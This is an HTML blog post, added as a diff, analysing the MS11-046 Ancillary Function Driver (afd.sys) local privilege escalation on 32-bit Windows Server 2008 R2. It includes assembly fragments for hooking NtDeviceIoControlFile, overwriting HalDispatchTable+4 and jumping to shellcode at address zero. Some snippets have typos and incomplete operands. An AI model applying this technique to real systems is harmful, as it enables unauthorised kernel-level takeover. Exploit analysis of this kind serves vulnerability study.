@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Ancillary Function Driver [MS11-046] — Yash Omer</title>
+  <meta name="description" content="Ancillary Function Driver [MS11-046]" />
+  <script src="../theme.js"></script>
+  <link rel="stylesheet" href="../styles.css" />
+</head>
+<body>
+  <main>
+    <div class="content">
+      <header class="site-header">
+        <p>
+          <a href="../index.html" class="brand">yashomer1994.github.io</a><span class="cursor" aria-hidden="true">▮</span>
+        </p>
+        <nav>
+          <a href="../index.html">Home</a>
+          <a href="../about.html">About</a>
+          <a href="lab-1-model-theft.html">Latest</a>
+          <button type="button" class="theme-toggle" id="theme-toggle">Dark</button>
+        </nav>
+      </header>
+      <hr class="header-rule" />
+
+      <p class="meta">January 31, 2021 · PE MSDOS</p>
+      <h1>Ancillary Function Driver [MS11-046]</h1>
+
+      <div class="post-body">
+<p>Started the kernel fuzzing in Windows Server 2008 R2 , 32-Bit. I identified this version of windows using vulnerable or unpatched version of Ancillary Function Driver(AFD).</p>
+<h2>Definition</h2>
+<p>The ancillary function driver supports windows sockets application in the afd.sys file. The afd.sys driver runs in a kernel mode and manages the Winsock TCP/IP communication protocols.</p>
+<h2>Analysis</h2>
+<p>Major Flaw in AFD Driver is it was improperly validating input passed from the user mode to the kernel mode, through which any user can get Administrator Rights.<br />
+For exploiting this vulnerability , the user should have Login Credentials as a Local User.</p>
+<h2>Bug Mechanism</h2>
+<p>Once Execution is done , Process waits for a user to enter an argument, with successfull execution of a process, user will able to exploit Privilege Escalation.</p>
+<p><strong><em>BUG</em></strong></p>
+<p>Once the Execution is started :</p>
+<p>It calls “ZwQuerySystemInformation” with user arguments such as -&gt; <strong>InfoType = SystemModuleInfo</strong></p>
+<p>After command execution , it will list the loaded drivers with there memory addresses in kernel mode.</p>
+<p><img alt="" src="../assets/afd/1.png" /></p>
+<p>We identified the Entry of "<strong>ntoskrnl.exe</strong>" or "<strong>ntkrnlpa</strong>" in the list the memory is loaded in the kernel space from "<strong>“_SYSTEM_MODULE_INFORMATION</strong>".</p>
+<p><img alt="" src="../assets/afd/2.png" /></p>
+<p><strong>LoadLibrary()</strong> will Load the module in user mode and start searching for the address of "<strong>HalfDispatchTable</strong>".</p>
+<p><img alt="" src="../assets/afd/3.png" /></p>
+<p>Instructions are used to get the “<strong>HalDispatchTable +4</strong>” in module “ntkrnlpa.exe” in kernel space.</p>
+<p><img alt="" src="../assets/afd/4.png" /></p>
+<h2>Exploit</h2>
+<ol>
+<li>The exploit will start by fetching the address to “NtDeviceIoControlFile” API from NTDLL. Once the address is fetched it performs an inline function hooks to the API.</li>
+</ol>
+<p>Code is used to Perform the Hook:</p>
+<pre><code>    MOV BYTE PTR DS:[ESI],68
+
+/* ESI points to start of the address of NtDeviceIoControlFile */
+
+    MOV DWORD PTR DR:[ESI+1],
+    MOV BYTE PTR DR:[ESI+5]
+
+/* Above instructions used to inject instructions in to the address space of NtDeviceIoControlFile */
+</code></pre>
+<p><img alt="" src="../assets/afd/5.png" /></p>
+<pre><code>PUSH &lt;zero.loc_401640&gt;
+RETN
+</code></pre>
+<p>The address <zero.loc_401640> points to the hook routine which will be executed before NtDeviceIoControlFiles code as shown below :</p>
+<pre><code> CMP DWORD PTR SS:[ESP+18],12007
+
+/* 12007 indicates the Iocontrolcode for socket connect */
+
+    JNZ SHORT &lt;zero.loc_40165B&gt;
+    MOV EAX,DWORD PTR DS:[40FA70]
+
+/* contains values 8053513c (address of HalDispatchTable + $4) */
+
+    MOV DWORD PTR SS:[ESP+24],EAX
+
+/* output buffer for NtDeviceIoControlFile, the address now point to 8053513c*/
+
+MOV DWORD PTR SS:[ESP+80], 0
+
+/* The length of output buffer is set to 0  */
+
+LEA EAX DWORD PTR DS:[40FA78]
+
+/* Location of the original NtDeviceControlFile which gets executed next. */
+
+PUSH EAX
+RETN
+</code></pre>
+<p>The above code will change arguments provided to function “<strong>NtDeviceIoControlFile</strong>” when a socket connection bein performed, the arguments changed are output buffer and its length as given below :</p>
+<pre><code>    Outbuffer = 8053513c
+    Length = 0;
+</code></pre>
+<p>The routine at adddress <strong>0x0040fa78</strong> is executed , “<strong>NtDeviceIoControlFile</strong>” .</p>
+<pre><code> MOV EAX 42, 
+ MOV EDX,7FF30300
+ CALL EDX
+ RETN 28
+</code></pre>
+<p>The modified code is it will hook without any error to connect with 127.0.0.1 at 135 port using connect() “<strong>NtDeviceControl</strong>”.<br />
+The driver writes location to (0x8053513c) -&gt; HalfDispatchTable + $4) with the value 0.  </p>
+<p>Once is hook successfully overwrites the memory to 0, NtDeviceIoControlFile is removed.</p>
+<p><img alt="" src="../assets/afd/6.png" /></p>
+<p>Final Step of Exploitation To call the API “<strong>ntdll.ZwQueryIntervalProfile</strong>".</p>
+<pre><code> CALL DWORD PTR [HalfDispatchTable+$4]
+</code></pre>
+<p>As mentioned earlier the value of HalfDispatchTable+$4 is now 0 stored after call to connect().</p>
+<pre><code>    New Pointer PTR:
+    CALL 0x0000000
+</code></pre>
+<p><img alt="" src="../assets/afd/7.png" /></p>
+<p>The shellcode is copied to the location of 0x00000000 gets executed.</p>
+<p>API CALL “<strong>NtDeviceIoControlFile</strong>” will lead to arbitrary memory overwrite which will lead to Privilege Escalation.</p>
+<p><img alt="" src="../assets/afd/8.png" /></p>
+<h2>Proof Of Concept</h2>
+<p><img alt="" src="../assets/afd/9.png" /></p>
+      </div>
+
+      <p class="footer-nav"><a href="../index.html">← Home</a></p>
+    </div>
+  </main>
+</body>
+</html>
